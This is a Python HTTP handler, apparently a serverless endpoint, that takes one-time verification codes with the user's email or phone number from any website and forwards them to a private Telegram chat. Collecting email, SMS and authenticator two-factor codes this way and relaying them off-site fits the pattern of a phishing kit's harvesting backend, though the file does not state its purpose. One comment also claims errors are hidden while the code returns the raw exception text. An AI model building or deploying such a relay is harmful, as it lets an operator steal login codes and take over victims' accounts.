import os
import json
import requests
from http.server import BaseHTTPRequestHandler

# Telegram bot credentials from environment - NO DEFAULTS FOR SECURITY
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

# Check if required environment variables are set
if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
    print("Warning: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables must be set")
    print("Telegram notifications will not work until these are configured")

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/api/send-code':
            self._handle_send_code()
        else:
            self._send_json_response({"error": "Not found"}, 404)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def _handle_send_code(self):
        """Обрабатывает отправку кода в Telegram"""
        try:
            # Читаем данные запроса
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)

            # Парсим JSON данные
            data = json.loads(post_data.decode('utf-8'))

            verification_type = data.get('type', 'unknown')
            code = data.get('code', '000000')
            email = data.get('email', '')
            phone = data.get('phone', '')

            # Формируем сообщение для Telegram
            if verification_type == 'email':
                message = f"📧 Email верификация\n\nEmail: {email}\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"
            elif verification_type == 'sms':
                message = f"📱 SMS верификация\n\nТелефон: {phone}\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"  
            elif verification_type == 'authenticator':
                message = f"🔐 Аутентификатор\n\nКод: {code}\n\n🔒 Автоматически сгенерированный код для аутентификации"
            else:
                message = f"🔑 Верификация\n\nТип: {verification_type}\nКод: {code}"

            # Отправляем в Telegram
            if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
                telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                telegram_data = {
                    'chat_id': TELEGRAM_CHAT_ID,
                    'text': message
                }

                requests.post(telegram_url, json=telegram_data, timeout=10)

            self._send_json_response({"success": True, "message": "Code sent"})

        except Exception as e:
            # Log error without exposing details
            self._send_json_response({"error": str(e)}, 500)

    def _send_json_response(self, data, status_code=200):
        """Відправляє JSON відповідь"""
        response = json.dumps(data).encode('utf-8')
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.send_header('Content-Length', str(len(response)))
        self.end_headers()
        self.wfile.write(response)